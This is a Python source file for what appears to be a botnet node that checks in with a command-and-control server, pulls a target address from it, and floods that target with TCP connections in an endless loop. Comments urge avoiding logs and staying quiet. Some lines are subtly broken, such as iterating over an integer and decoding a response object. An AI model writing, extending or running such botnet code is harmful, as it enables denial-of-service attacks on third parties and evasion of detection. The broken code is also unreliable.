# This is the node template for your network.
import socket
from os import system
from requests import get
from time import sleep

class Node:
    # Initialize object with the first C&C socket.
    def __init__(self):
        # C&C setup:
        self.cc_ip = socket.gethostname() # Change this.
        self.cc_port = 2022
        # List of sockets:
        self.connections = []
        # Actual target setup:
        self.target_ip = ""
        self.target_port = 0

    # Calm down and close connections:
    def close_connections(self):
        for connection in len(self.connections):
            try:
                self.connections[connection].close()
            except Exception as error:
                # You do not want to create logs, just ignore.
                pass

    # Tell C&C that this node are up or check for the C&C itself.
    def ping_cc(self):
        try:
            # Ping with a disposable socket:
            ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ping_socket.connect((self.cc_ip, self.cc_port))
            sleep(0.1)
            ping_socket.close()
            return 0
        except:
            return 1

    # Check for new targets.
    def update_target(self):
        # Get file on CC with new data
        try:
            data = get("http://{0}/target".format(self.cc_ip)).decode().split(":")
            self.target_ip = data[0]
            self.target_port = int(data[1])
        except Exception as error:
            # Again, try to not make much noise.
            sleep(0.1)
            pass

    def attack(self):
        socket_id = 0
        print("Attacking {0}:{1}".format(self.target_ip, self.target_port))
        while True:
            try:
                self.connections.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
                self.connections[socket_id].connect((self.target_ip, self.target_port))
                socket_id += 1
                # Do not overload node's host:
                sleep(0.1)
            except Exception as error:
                # Failed? Try to update the target socket:
                self.update_target()
                # Keep failing? Try to not DDoS your CC server too:
                sleep(1)

if __name__ == "__main__":
    node = Node()
    node.ping_cc()
    node.update_target()
    node.attack()
